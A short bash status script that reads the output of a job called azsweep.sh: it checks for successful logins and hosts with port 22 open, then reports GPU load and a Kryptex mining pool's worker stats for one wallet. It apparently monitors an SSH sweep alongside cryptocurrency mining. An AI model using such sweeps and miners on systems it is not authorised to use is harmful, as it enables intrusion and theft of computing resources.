set +e
echo "== azsweep read $(date -u +%FT%TZ)"
F=/home/ubuntu/ul2/azsweep.out
pkill -0 -f azsweep.sh 2>/dev/null && echo "RUNNING=yes" || echo "RUNNING=no"
echo "--- lines=$(wc -l < $F 2>/dev/null)"
grep -E 'LOGIN_OK|=== DONE|IPS=' $F 2>/dev/null | head -20
echo "--- open22=$(grep -vc PORT22_CLOSED $F 2>/dev/null)"
echo "--- sample"
grep -v PORT22_CLOSED $F 2>/dev/null | head -40 | cut -c1-200
echo "--- 22open list"
grep -E '=> ' $F | awk '{print $1}' | sort -u | head -40
echo "--- gpu"; nvidia-smi --query-gpu=utilization.gpu,power.draw --format=csv,noheader
echo "--- pool"; curl -s -m 20 -H 'User-Agent: ul' 'https://pool.kryptex.com/prl/api/v3/miner/workers/prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz' | tr '{' '\n' | grep -E '149-81-10-242' | head -3
echo done
